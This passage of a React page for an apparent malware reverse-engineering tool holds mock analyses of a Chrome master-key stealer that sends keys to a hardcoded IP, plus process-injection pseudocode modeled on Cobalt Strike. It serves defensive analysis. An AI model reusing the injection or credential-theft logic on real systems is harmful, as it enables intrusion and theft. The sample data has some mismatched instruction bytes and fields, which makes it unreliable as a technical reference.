      { id: 8, text: "}", correspondsToAsmIds: [7], correspondsToPCodeIds: [5] }
    ],
    aiAnalysis: {
      purpose: "Chromium Master Key DPAPI Decryption and WCF Exfiltration",
      algorithmicLogic: "Locates the Chrome Local State configuration, strips the 5-byte 'DPAPI' prefix from the encrypted key string, invokes CryptUnprotectData (ProtectedData.Unprotect) to derive the raw 256-bit AES Master Key, and exfiltrates it to a custom WCF Net.Tcp service on port 18342.",
      evasionTechniques: [
        "ConfuserEx string encryption and control flow mangling",
        "Direct DPAPI API usage avoiding hook detection"
      ],
      reversingTips: "Run de4dot against the raw sample to clear proxy delegate calls and reveal the hardcoded IP endpoint 185.161.248.42.",
      mitreTactics: ["TA0006: Credential Access", "TA0009: Collection", "TA0011: Command & Control"]
    },
    variables: [
      { original: "localStatePath", type: "string", inferredType: "string", suggestedName: "chromeLocalStatePath", stackOffset: "arg0", description: "Path to Google Chrome Local State config" },
      { original: "masterKey", type: "byte[]", inferredType: "byte[]", suggestedName: "rawAesMasterKey", stackOffset: "loc1", description: "256-bit AES master decryption key" }
    ]
  },
  "SAMPLE-005": { // CobaltStrike_Beacon.bin
    sampleId: "SAMPLE-005",
    functionName: "InjectReflectiveDllAndSleepMask",
    signature: "BOOL __fastcall InjectReflectiveDllAndSleepMask(HANDLE hProcess, PBYTE pBeaconShellcode)",
    returnType: "BOOL",
    asm: [
      { id: 1, address: "0x000000018001000", bytes: "48 89 5C 24 08", mnemonic: "mov", operands: "[rsp+8], rbx", comment: "; Save non-volatile register" },
      { id: 2, address: "0x000000018001005", bytes: "48 89 74 24 10", mnemonic: "mov", operands: "[rsp+16], rsi", comment: "; Save RSI" },
      { id: 3, address: "0x00000001800100A", bytes: "48 83 EC 38", mnemonic: "sub", operands: "rsp, 0x38", comment: "; Shadow stack allocation" },
      { id: 4, address: "0x00000001800100E", bytes: "41 B9 40 00 00 00", mnemonic: "mov", operands: "r9d, PAGE_EXECUTE_READWRITE", comment: "; flProtect = 0x40" },
      { id: 5, address: "0x000000018001014", bytes: "41 B8 00 30 00 00", mnemonic: "r8d, MEM_COMMIT | MEM_RESERVE", operands: "", comment: "; flAllocationType = 0x3000" },
      { id: 6, address: "0x00000001800101A", bytes: "BA 00 40 00 00", mnemonic: "mov", operands: "edx, 0x40000", comment: "; dwSize = 256 KB" },
      { id: 7, address: "0x00000001800101F", bytes: "48 89 C9", mnemonic: "mov", operands: "rcx, [hTargetProcess]", comment: "; Target process (svchost.exe)" },
      { id: 8, address: "0x000000018001022", bytes: "FF 15 80 22 00 00", mnemonic: "call", operands: "qword ptr [VirtualAllocEx]", comment: "; Allocate RWX region inside svchost.exe" },
      { id: 9, address: "0x000000018001028", bytes: "48 89 C3", mnemonic: "mov", operands: "rbx, rax", comment: "; rbx = lpRemoteAddress" },
      { id: 10, address: "0x00000001800102B", bytes: "FF 15 90 22 00 00", mnemonic: "call", operands: "qword ptr [WriteProcessMemory]", comment: "; Copy Reflective DLL Beacon image" },
      { id: 11, address: "0x000000018001031", bytes: "FF 15 A0 22 00 00", mnemonic: "call", operands: "qword ptr [CreateRemoteThread]", comment: "; Execute remote beacon entry point" },
      { id: 12, address: "0x000000018001037", bytes: "48 83 C4 38", mnemonic: "add", operands: "rsp, 0x38", comment: "; Stack recovery" },
      { id: 13, address: "0x00000001800103B", bytes: "C3", mnemonic: "ret", operands: "", comment: "; Return" }
    ],
    pcode: [
      { id: 1, address: "0x00000001800100A", opcode: "INT_SUB", output: "(register, RSP, 8)", inputs: ["(register, RSP, 8)", "(const, 0x38, 8)"], explanation: "Allocates 64-bit shadow space" },
      { id: 2, address: "0x000000018001022", opcode: "CALLOTHER", output: "(register, RAX, 8)", inputs: ["VirtualAllocEx", "(register, RCX, 8)", "(const, 0x40000, 8)", "(const, 0x40, 8)"], explanation: "Allocates remote memory with PAGE_EXECUTE_READWRITE" },
      { id: 3, address: "0x00000001800102B", opcode: "CALLOTHER", inputs: ["WriteProcessMemory", "(register, RCX, 8)", "(register, RBX, 8)"], explanation: "Writes Cobalt Strike Reflective DLL payload into remote PID" },
      { id: 4, address: "0x000000018001031", opcode: "CALLOTHER", output: "(register, RAX, 8)", inputs: ["CreateRemoteThread", "(register, RCX, 8)", "(register, RBX, 8)"], explanation: "Creates execution thread pointing to reflective loader" },
      { id: 5, address: "0x00000001800103B", opcode: "RETURN", inputs: ["(register, RAX, 8)"], explanation: "Returns success status" }
    ],
    pseudocode: [
      { id: 1, text: "BOOL InjectReflectiveDllAndSleepMask(HANDLE hProcess, PBYTE pBeaconShellcode) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1] },
      { id: 2, text: "    LPVOID pRemoteMem = NULL;", correspondsToAsmIds: [3], correspondsToPCodeIds: [1] },
      { id: 3, text: "    HANDLE hRemoteThread = NULL;", correspondsToAsmIds: [3], correspondsToPCodeIds: [1] },
      { id: 4, text: "    // Allocate RWX memory in target svchost.exe", correspondsToAsmIds: [4, 5, 6, 7, 8], correspondsToPCodeIds: [2] },
      { id: 5, text: "    pRemoteMem = VirtualAllocEx(hProcess, NULL, 0x40000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);", correspondsToAsmIds: [4, 5, 6, 7, 8, 9], correspondsToPCodeIds: [2] },
      { id: 6, text: "    if (!pRemoteMem) return FALSE;", correspondsToAsmIds: [9], correspondsToPCodeIds: [2] },
      { id: 7, text: "    // Write Reflective DLL Beacon payload", correspondsToAsmIds: [10], correspondsToPCodeIds: [3] },
      { id: 8, text: "    WriteProcessMemory(hProcess, pRemoteMem, pBeaconShellcode, 0x40000, NULL);", correspondsToAsmIds: [10], correspondsToPCodeIds: [3] },
      { id: 9, text: "    // Spawn remote thread to trigger Stephen Fewer's ReflectiveLoader", correspondsToAsmIds: [11], correspondsToPCodeIds: [4] },
      { id: 10, text: "    hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL);", correspondsToAsmIds: [11], correspondsToPCodeIds: [4] },
      { id: 11, text: "    return (hRemoteThread != NULL);", correspondsToAsmIds: [12, 13], correspondsToPCodeIds: [5] },
      { id: 12, text: "}", correspondsToAsmIds: [13], correspondsToPCodeIds: [5] }
    ],
    pseudocodeDeflattened: [
      { id: 1, text: "/* [SLEEP MASK NORMALIZED] Cobalt Strike Remote Injection */", correspondsToAsmIds: [1], correspondsToPCodeIds: [1] },
      { id: 2, text: "BOOL InjectReflectiveDllAndSleepMask(HANDLE hProcess, PBYTE pBeaconShellcode) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1] },
      { id: 3, text: "    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, 0x40000, 0x3000, PAGE_EXECUTE_READWRITE);", correspondsToAsmIds: [4, 5, 6, 7, 8], correspondsToPCodeIds: [2] },
      { id: 4, text: "    WriteProcessMemory(hProcess, pRemoteMem, pBeaconShellcode, 0x40000, NULL);", correspondsToAsmIds: [10], correspondsToPCodeIds: [3] },
      { id: 5, text: "    return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL) != NULL;", correspondsToAsmIds: [11, 12, 13], correspondsToPCodeIds: [4, 5] },
      { id: 6, text: "}", correspondsToAsmIds: [13], correspondsToPCodeIds: [5] }
    ],
    aiAnalysis: {
      purpose: "Process Injection via VirtualAllocEx / CreateRemoteThread into svchost.exe",
      algorithmicLogic: "Performs classic Process Injection by reserving PAGE_EXECUTE_READWRITE virtual memory inside a legitimate Windows svchost.exe process, copying the raw Reflective DLL image, and creating a remote execution thread targeting the exported ReflectiveLoader function.",
      evasionTechniques: [
        "Process Hollowing / Remote Thread Injection into trusted Microsoft binaries",
        "Sleep Mask in-memory encryption to defeat dynamic memory dumps"
      ],
      reversingTips: "Hook CreateRemoteThread or monitor Sysmon Event ID 8 to catch the injected target thread IP and extract the Cobalt Strike watermark configuration structure.",
      mitreTactics: ["TA0004: Privilege Escalation", "TA0005: Defense Evasion", "TA0006: Credential Access"]
    },
    variables: [
      { original: "hProcess", type: "HANDLE", inferredType: "HANDLE", suggestedName: "hTargetProcess", stackOffset: "rcx", description: "Handle to remote svchost.exe process" },
      { original: "pRemoteMem", type: "void*", inferredType: "LPVOID", suggestedName: "pRemoteBeaconAlloc", stackOffset: "rbx", description: "Remote RWX memory allocation pointer" }
    ]
  }
};

export default function DecompilerIrPage() {
  const [selectedSampleId, setSelectedSampleId] = useState<string>("SAMPLE-001");
  const [highlightedAsmId, setHighlightedAsmId] = useState<number | null>(null);
  const [highlightedPCodeId, setHighlightedPCodeId] = useState<number | null>(null);
  const [highlightedPseudoId, setHighlightedPseudoId] = useState<number | null>(null);

  // Optimizer & Transformation Toggles
  const [isDeflattened, setIsDeflattened] = useState<boolean>(false);
  const [isDeadCodeEliminated, setIsDeadCodeEliminated] = useState<boolean>(false);
  const [isTypePropagated, setIsTypePropagated] = useState<boolean>(false);
  const [customVariableNames, setCustomVariableNames] = useState<Record<string, string>>({});
  const [copiedNotification, setCopiedNotification] = useState<string | null>(null);

  const sampleData = DECOMPILER_DATA[selectedSampleId] || DECOMPILER_DATA["SAMPLE-001"];
  const currentSample = MALWARE_SAMPLES.find(s => s.id === selectedSampleId) || MALWARE_SAMPLES[0];

  // Synchronized Selection Handler
  const handleSelectAsm = (line: AsmLine) => {
    setHighlightedAsmId(line.id);
    const matchedPCode = sampleData.pcode.find(p => p.address === line.address);
    setHighlightedPCodeId(matchedPCode ? matchedPCode.id : null);
    const matchedPseudo = sampleData.pseudocode.find(ps => ps.correspondsToAsmIds.includes(line.id));
    setHighlightedPseudoId(matchedPseudo ? matchedPseudo.id : null);
  };

  const handleSelectPCode = (op: PCodeOp) => {
    setHighlightedPCodeId(op.id);
    const matchedAsm = sampleData.asm.find(a => a.address === op.address);
    setHighlightedAsmId(matchedAsm ? matchedAsm.id : null);
    const matchedPseudo = sampleData.pseudocode.find(ps => ps.correspondsToPCodeIds.includes(op.id));
    setHighlightedPseudoId(matchedPseudo ? matchedPseudo.id : null);
  };

  const handleSelectPseudo = (ps: PseudocodeLine) => {
    setHighlightedPseudoId(ps.id);
    if (ps.correspondsToAsmIds.length > 0) {
      setHighlightedAsmId(ps.correspondsToAsmIds[0]);
    }
    if (ps.correspondsToPCodeIds.length > 0) {
      setHighlightedPCodeId(ps.correspondsToPCodeIds[0]);
    }
  };

  // Variable rename handler
  const handleRenameVariable = (original: string, newName: string) => {
    setCustomVariableNames(prev => ({
      ...prev,
      [original]: newName
    }));
  };

  // Filtered Display Data
  const displayedAsm = useMemo(() => {
    if (!isDeadCodeEliminated) return sampleData.asm;
    return sampleData.asm.filter(a => !a.isDeadCode);
  }, [sampleData, isDeadCodeEliminated]);

  const displayedPCode = useMemo(() => {
    if (!isDeadCodeEliminated) return sampleData.pcode;
    return sampleData.pcode.filter(p => !p.isDeadCode);
  }, [sampleData, isDeadCodeEliminated]);

  const displayedPseudocode = useMemo(() => {
    const rawLines = isDeflattened ? sampleData.pseudocodeDeflattened : sampleData.pseudocode;
    let lines = isDeadCodeEliminated ? rawLines.filter(l => !l.isDeadCode) : rawLines;

    // Apply type propagation and variable renaming
    return lines.map(line => {
      let text = line.text;
      sampleData.variables.forEach(v => {
        const replacementName = customVariableNames[v.original] || (isTypePropagated ? v.suggestedName : v.original);
        if (replacementName && replacementName !== v.original) {
          text = text.replaceAll(v.original, replacementName);
        }
      });
      return {
        ...line,
        text
      };
    });
  }, [sampleData, isDeflattened, isDeadCodeEliminated, isTypePropagated, customVariableNames]);

  const handleCopyCode = (code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedNotification("Copied to clipboard!");
    setTimeout(() => setCopiedNotification(null), 2000);
  };

  return (
    <div style={{ padding: "20px 24px", display: "flex", flexDirection: "column", gap: 18 }}>
      {/* Header & Sample Selector */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid var(--border)", paddingBottom: 14, flexWrap: "wrap", gap: 12 }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: "#06b6d4", textTransform: "uppercase", letterSpacing: "0.08em" }}>
              DECOMPILER &amp; IR STUDIO
            </span>
            <span className="badge-critical">GHIDRA P-CODE ENGINE v11.1</span>
            <span className="badge-low">AST RECONSTRUCTION</span>
          </div>
          <h1 style={{ fontSize: 20, fontWeight: 900, color: "#f1f5f9", marginTop: 2 }}>
            Tri-Pane Synchronized C Decompiler &amp; P-Code Micro-IR
          </h1>
          <p style={{ fontSize: 12, color: "var(--muted)", marginTop: 2 }}>
            Synchronized 3-way bytecode analysis: Machine Disassembly (x86/x64), Ghidra P-Code Intermediate Representation, and Reconstructed C Pseudocode.
          </p>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <select
            className="tool-select"
            value={selectedSampleId}
            onChange={(e) => {
              setSelectedSampleId(e.target.value);
              setHighlightedAsmId(null);
              setHighlightedPCodeId(null);
              setHighlightedPseudoId(null);
              setCustomVariableNames({});
            }}
          >
            {MALWARE_SAMPLES.map(s => (
              <option key={s.id} value={s.id}>{s.name} ({s.architecture}) - {s.family}</option>
            ))}
          </select>

          <button
            onClick={() => handleCopyCode(displayedPseudocode.map(l => l.text).join("\n"))}
            className="btn-secondary"
          >
            <Copy size={13} color="#06b6d4" />
            <span>{copiedNotification || "Copy C Pseudocode"}</span>
          </button>
        </div>
      </div>

      {/* Control Bar: Optimizers, CFG De-flattening & Variable Type Propagation */}
      <div style={{
        background: "var(--surface)",
        border: "1px solid var(--border)",
        borderRadius: 8,
        padding: "10px 14px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        flexWrap: "wrap",
        gap: 12
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
          {/* CFG De-flattening Toggle */}
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <button
              onClick={() => setIsDeflattened(!isDeflattened)}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                padding: "6px 12px",
                borderRadius: 6,
                fontSize: 11,
                fontWeight: 700,
                background: isDeflattened ? "rgba(16,185,129,0.2)" : "var(--bg)",
                color: isDeflattened ? "#10b981" : "var(--muted)",
                border: isDeflattened ? "1px solid #10b981" : "1px solid var(--border)",
                cursor: "pointer"
              }}
            >
              <GitBranch size={13} />
              <span>CFG De-Flattening: {isDeflattened ? "ON (Normalized)" : "OFF (Obfuscated)"}</span>
            </button>
          </div>

          {/* Dead Code Elimination */}
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <button
              onClick={() => setIsDeadCodeEliminated(!isDeadCodeEliminated)}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                padding: "6px 12px",
                borderRadius: 6,
                fontSize: 11,
                fontWeight: 700,
                background: isDeadCodeEliminated ? "rgba(245,158,11,0.2)" : "var(--bg)",
                color: isDeadCodeEliminated ? "#f59e0b" : "var(--muted)",
                border: isDeadCodeEliminated ? "1px solid #f59e0b" : "1px solid var(--border)",
                cursor: "pointer"
              }}
            >
              <Filter size={13} />
              <span>Dead Code Elimination (DCE): {isDeadCodeEliminated ? "ACTIVE" : "OFF"}</span>
            </button>
          </div>

          {/* Type Propagation Toggle */}
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <button
              onClick={() => setIsTypePropagated(!isTypePropagated)}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                padding: "6px 12px",
                borderRadius: 6,
                fontSize: 11,
                fontWeight: 700,
                background: isTypePropagated ? "rgba(6,182,212,0.2)" : "var(--bg)",
                color: isTypePropagated ? "#06b6d4" : "var(--muted)",
                border: isTypePropagated ? "1px solid #06b6d4" : "1px solid var(--border)",
                cursor: "pointer"
              }}
            >
              <Tag size={13} />
              <span>Auto-Type Propagation: {isTypePropagated ? "APPLIED" : "RAW AST"}</span>
            </button>
          </div>
        </div>

        {/* Function Signature Display */}
        <div style={{ fontFamily: "monospace", fontSize: 11, color: "#38bdf8", background: "var(--bg)", padding: "4px 10px", borderRadius: 4, border: "1px solid var(--border)" }}>
          Target Routine: <strong style={{ color: "#f1f5f9" }}>{sampleData.signature}</strong>
        </div>
      </div>

      {/* 3-WAY SYNCHRONIZED TRI-PANE VIEWER */}
      <div style={{
        display: "grid",
        gridTemplateColumns: "1fr 1.15fr 1.25fr",
        gap: 12,
        minHeight: 520
      }}>
        {/* PANE 1: Disassembled Assembly */}
        <div style={{
          background: "#020408",
          border: "1px solid var(--border)",
          borderRadius: 8,
          display: "flex",
          flexDirection: "column",
          overflow: "hidden"
        }}>
          <div style={{
            background: "var(--surface-2)",
            padding: "8px 12px",
            borderBottom: "1px solid var(--border)",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between"
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Binary size={14} color="#06b6d4" />
              <span style={{ fontSize: 11, fontWeight: 800, color: "#f1f5f9", textTransform: "uppercase", letterSpacing: "0.05em" }}>
                Pane 1: Assembly (x86/x64)
              </span>
            </div>
            <span style={{ fontSize: 9.5, color: "var(--muted)", fontFamily: "monospace" }}>{displayedAsm.length} instructions</span>
          </div>

          <div style={{ flex: 1, overflowY: "auto", fontFamily: "SFMono-Regular, Menlo, monospace", fontSize: 11, padding: "4px 0" }}>
            {displayedAsm.map((line) => {
              const isSelected = highlightedAsmId === line.id;
              return (
                <div
                  key={line.id}
                  onClick={() => handleSelectAsm(line)}
                  style={{
                    display: "grid",
                    gridTemplateColumns: "75px 80px 55px 1fr",
                    padding: "4px 8px",
                    background: isSelected ? "rgba(6, 182, 212, 0.18)" : line.isDeadCode ? "rgba(239, 68, 68, 0.05)" : "transparent",
                    borderLeft: isSelected ? "3px solid #06b6d4" : "3px solid transparent",
                    cursor: "pointer",
                    transition: "background 0.1s ease",
                    borderBottom: "1px solid #070e1a",
                    opacity: line.isDeadCode ? 0.6 : 1
                  }}
                  title={line.comment}
                >
                  <span style={{ color: "#38bdf8", fontSize: 10.5 }}>{line.address}</span>
                  <span style={{ color: "#64748b", fontSize: 9.5 }}>{line.bytes}</span>
                  <span style={{
                    color: line.mnemonic.startsWith("j") ? "#f59e0b" : line.mnemonic === "call" ? "#ef4444" : line.mnemonic === "ret" ? "#ec4899" : "#10b981",
                    fontWeight: 700
                  }}>
                    {line.mnemonic}
                  </span>
                  <span style={{ color: "#cbd5e1", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    {line.operands}
                  </span>
                </div>
              );
            })}
          </div>
        </div>

        {/* PANE 2: Intermediate Representation (Ghidra P-Code) */}
        <div style={{
          background: "#020408",
          border: "1px solid var(--border)",
          borderRadius: 8,
          display: "flex",
          flexDirection: "column",
          overflow: "hidden"
        }}>
          <div style={{
            background: "var(--surface-2)",
            padding: "8px 12px",
            borderBottom: "1px solid var(--border)",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between"
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Layers3 size={14} color="#a855f7" />
              <span style={{ fontSize: 11, fontWeight: 800, color: "#f1f5f9", textTransform: "uppercase", letterSpacing: "0.05em" }}>
                Pane 2: Ghidra P-Code IR
              </span>
            </div>
            <span className="badge-medium">Micro-Ops</span>
          </div>

          <div style={{ flex: 1, overflowY: "auto", fontFamily: "SFMono-Regular, Menlo, monospace", fontSize: 11, padding: "4px 0" }}>
            {displayedPCode.map((op) => {
              const isSelected = highlightedPCodeId === op.id;
              return (
                <div
                  key={op.id}
                  onClick={() => handleSelectPCode(op)}
                  style={{
                    padding: "5px 10px",
                    background: isSelected ? "rgba(168, 85, 247, 0.18)" : op.isDeadCode ? "rgba(239, 68, 68, 0.05)" : "transparent",
                    borderLeft: isSelected ? "3px solid #a855f7" : "3px solid transparent",
                    cursor: "pointer",
                    borderBottom: "1px solid #070e1a",
                    transition: "background 0.1s ease"
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ color: "#64748b", fontSize: 9.5 }}>{op.address}</span>
                    <span style={{
                      fontSize: 10,
                      fontWeight: 800,
                      color: op.opcode.startsWith("BRANCH") || op.opcode === "CBRANCH" ? "#f59e0b" : op.opcode === "CALLOTHER" || op.opcode === "CALL" ? "#ef4444" : "#a855f7",
                      background: "rgba(168, 85, 247, 0.1)",
                      padding: "1px 5px",
                      borderRadius: 3
                    }}>
                      {op.opcode}
                    </span>
                    {op.output && (
                      <span style={{ color: "#38bdf8", fontWeight: 600 }}>{op.output} =</span>
                    )}
                    <span style={{ color: "#e2e8f0" }}>{op.inputs.join(", ")}</span>
                  </div>
                  <div style={{ fontSize: 9.5, color: "#64748b", marginTop: 2, fontStyle: "italic" }}>
                    &gt; {op.explanation}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* PANE 3: Reconstructed High-Level C Pseudocode */}
        <div style={{
          background: "#020408",
          border: "1px solid var(--border)",
          borderRadius: 8,
          display: "flex",
          flexDirection: "column",
          overflow: "hidden"
        }}>
          <div style={{
            background: "var(--surface-2)",
            padding: "8px 12px",
            borderBottom: "1px solid var(--border)",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between"
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Code size={14} color="#10b981" />
              <span style={{ fontSize: 11, fontWeight: 800, color: "#f1f5f9", textTransform: "uppercase", letterSpacing: "0.05em" }}>
                Pane 3: Reconstructed C Pseudocode
              </span>
            </div>
            <span className="badge-low">AST Engine</span>
          </div>

          <div style={{ flex: 1, overflowY: "auto", fontFamily: "SFMono-Regular, Menlo, monospace", fontSize: 11.5, padding: "8px 0", lineHeight: 1.6 }}>
            {displayedPseudocode.map((line) => {
              const isSelected = highlightedPseudoId === line.id;
              return (
                <div
                  key={line.id}
                  onClick={() => handleSelectPseudo(line)}
                  style={{
                    padding: "2px 12px",
                    background: isSelected ? "rgba(168, 185, 129, 0.18)" : line.isDeadCode ? "rgba(239, 68, 68, 0.08)" : "transparent",
                    borderLeft: isSelected ? "3px solid #10b981" : "3px solid transparent",
                    cursor: "pointer",
                    color: line.isDeadCode ? "#ef4444" : line.text.includes("//") || line.text.includes("/*") ? "#64748b" : "#f1f5f9",
                    whiteSpace: "pre",
                    fontFamily: "monospace"
                  }}
                >
                  <span style={{ color: "#334155", marginRight: 10, userSelect: "none", fontSize: 10 }}>{line.id.toString().padStart(2, "0")}</span>
                  <span>{line.text}</span>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {/* Bottom Grid: Interactive Variable Type Propagation Matrix & AI Copilot Subroutine Annotator */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
        {/* Section A: Variable Type Propagation & Stack Offset Renaming */}
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14 }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Tag size={14} color="#06b6d4" />
              <span style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9" }}>
                Variable Type Propagation &amp; Stack Frame Symbols
              </span>
            </div>
            <span className="badge-low">Type Inference</span>
          </div>

          <p style={{ fontSize: 11, color: "var(--muted)", marginBottom: 10 }}>
            Rename auto-generated decompilation symbols (e.g. <code style={{ color: "#38bdf8" }}>local_4</code>) to semantic malware reverse engineering descriptors. Edits reflect dynamically in Pane 3.
          </p>

          <table className="cerberus-table">
            <thead>
              <tr>
                <th>Symbol / Stack Offset</th>
                <th>Raw Type</th>
                <th>Inferred Type</th>
                <th>Semantic Renaming</th>
                <th>Description</th>
              </tr>
            </thead>
            <tbody>
              {sampleData.variables.map((v, idx) => (
                <tr key={idx}>
                  <td>
                    <div style={{ fontWeight: 700, color: "#cbd5e1", fontFamily: "monospace" }}>{v.original}</div>
                    <div style={{ fontSize: 9.5, color: "var(--muted)" }}>{v.stackOffset}</div>
                  </td>
                  <td style={{ fontFamily: "monospace", color: "#f59e0b" }}>{v.type}</td>
                  <td>
                    <span className="badge-medium">{v.inferredType}</span>
                  </td>
                  <td>
                    <input
                      type="text"
                      className="tool-input"
                      style={{ padding: "3px 8px", fontSize: 11, width: 150 }}
                      placeholder={v.suggestedName}
                      value={customVariableNames[v.original] !== undefined ? customVariableNames[v.original] : (isTypePropagated ? v.suggestedName : "")}
                      onChange={(e) => handleRenameVariable(v.original, e.target.value)}
                    />
                  </td>
                  <td style={{ fontSize: 10.5, color: "#94a3b8" }}>{v.description}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Section B: Inline AI Copilot Subroutine Annotator */}
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Sparkles size={14} color="#06b6d4" />
              <span style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9" }}>
                AI Copilot Subroutine Reverse Engineering Analysis
              </span>
            </div>
            <span className="badge-high">LLM RE REASONING</span>
          </div>

          <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 6, padding: "10px 12px" }}>
            <div style={{ fontSize: 11, fontWeight: 800, color: "#38bdf8", marginBottom: 2 }}>
              Purpose &amp; Objective:
            </div>
            <div style={{ fontSize: 12, color: "#f1f5f9", fontWeight: 600 }}>
              {sampleData.aiAnalysis.purpose}
            </div>
            <div style={{ fontSize: 11.5, color: "#cbd5e1", marginTop: 4, lineHeight: 1.5 }}>
              {sampleData.aiAnalysis.algorithmicLogic}
            </div>
          </div>

          {/* Evasion & Mitre */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
            <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 6, padding: "8px 10px" }}>
              <div style={{ fontSize: 10, fontWeight: 800, color: "#f59e0b", textTransform: "uppercase", marginBottom: 4 }}>
                Detected Anti-Analysis Evasions:
              </div>
              <ul style={{ listStyleType: "disc", paddingLeft: 16, fontSize: 11, color: "#cbd5e1", margin: 0 }}>
                {sampleData.aiAnalysis.evasionTechniques.map((ev, i) => (
                  <li key={i}>{ev}</li>
                ))}
              </ul>
            </div>

            <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 6, padding: "8px 10px" }}>
              <div style={{ fontSize: 10, fontWeight: 800, color: "#ec4899", textTransform: "uppercase", marginBottom: 4 }}>
                MITRE ATT&amp;CK Mapping:
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
                {sampleData.aiAnalysis.mitreTactics.map((tac, i) => (
                  <span key={i} className="badge-critical" style={{ width: "fit-content" }}>{tac}</span>
                ))}
              </div>
            </div>
          </div>

          {/* Reversing Advice */}
          <div style={{ background: "rgba(6, 182, 212, 0.08)", border: "1px solid rgba(6, 182, 212, 0.3)", borderRadius: 6, padding: "8px 12px" }}>
            <div style={{ fontSize: 10, fontWeight: 800, color: "#06b6d4", textTransform: "uppercase", marginBottom: 2 }}>
              Dynamic Binary Patching Strategy:
            </div>
            <div style={{ fontSize: 11, color: "#e2e8f0" }}>
              {sampleData.aiAnalysis.reversingTips}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
